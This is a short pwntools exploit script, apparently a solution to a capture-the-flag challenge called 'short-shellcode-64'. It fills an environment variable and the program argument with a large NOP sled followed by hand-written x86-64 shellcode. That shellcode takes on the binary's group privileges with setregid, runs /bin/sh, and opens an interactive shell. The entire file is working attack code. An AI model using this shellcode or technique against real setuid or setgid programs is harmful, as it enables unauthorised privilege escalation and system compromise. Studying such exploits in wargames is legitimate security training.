from pwn import *

# short-shellcode-64.bin instead of .S
# I couldn't get the assembler to do what I want,
# So i just wrote the machine code directly instead.
# What it does is relative jump to the address of shellcode on the stack.

SHELLCODE = ('\x90\x90\x90\x90' * 30000) + ('\x90' * 4000) + 'H\xb8l\x11\x11\x11\x11\x11\x11\x11H\xc1\xe08H\xc1\xe88\x0f\x05H\x89\xc7H\x89\xc6H\xb8r\x11\x11\x11\x11\x11\x11\x11H\xc1\xe08H\xc1\xe88\x0f\x05H\xbb//bin/shH1\xf6VSH\x89\xe7H1\xd2H\xb8;\x11\x11\x11\x11\x11\x11\x11H\xc1\xe08H\xc1\xe88\x0f\x05'
ARG1 = ''
ENV = {}

ENV = {'SHELLCODE': SHELLCODE}
ARG1 = SHELLCODE

p = process(["short-shellcode-64", ARG1], env=ENV)
p.interactive()
